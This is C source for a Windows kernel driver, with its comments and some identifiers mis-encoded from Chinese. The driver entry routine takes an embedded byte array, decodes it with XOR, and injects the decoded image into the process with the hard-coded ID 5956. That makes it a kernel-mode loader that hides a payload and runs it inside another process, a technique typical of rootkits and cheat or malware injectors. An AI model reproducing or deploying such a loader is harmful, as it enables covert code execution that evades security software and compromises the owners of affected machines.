#include<ntifs.h>
#include"dll.h"
#include"Inject.h"

#define �����豸����	L"\\DEVICE\\Inject"
#define ������������	L"\\??\\Inject"
void DeleteDevice(PDRIVER_OBJECT pDriver)
{
	DbgPrint("xcn:Enter DeleteDevice\n");
	if (pDriver->DeviceObject) //�����豸ָ��
	{

		//ɾ����������

		UNICODE_STRING uzSymbolName; //������������		 
		RtlInitUnicodeString(&uzSymbolName, ������������); //CreateFile
		DbgPrint("xcn:Remove symbolic links=%wZ\n", &uzSymbolName);
		IoDeleteSymbolicLink(&uzSymbolName);
		//
		DbgPrint("xcn:Deleting  Driver\n");
		IoDeleteDevice(pDriver->DeviceObject);//ɾ���豸����

	}
	DbgPrint("xcn:exit DeleteDevice\n");
}
void DriverUnload(PDRIVER_OBJECT pDriver)
{
	DeleteDevice(pDriver);
}

//�������
NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
	pRegistryPath;
	pDriverObject->DriverUnload = DriverUnload;
	SIZE_T dwImageSize = sizeof(sysData);

	unsigned char* pMemory = (unsigned char*)ExAllocatePool(PagedPool, dwImageSize);
	RtlCopyMemory(pMemory, sysData, dwImageSize);
	for (ULONG i = 0; i < dwImageSize; i++)
	{
		pMemory[i] ^= 0xd8;
		pMemory[i] ^= 0xcd;
	}

	Inject(5956, pMemory, dwImageSize);
	ExFreePool(pMemory);


	return STATUS_SUCCESS;
}
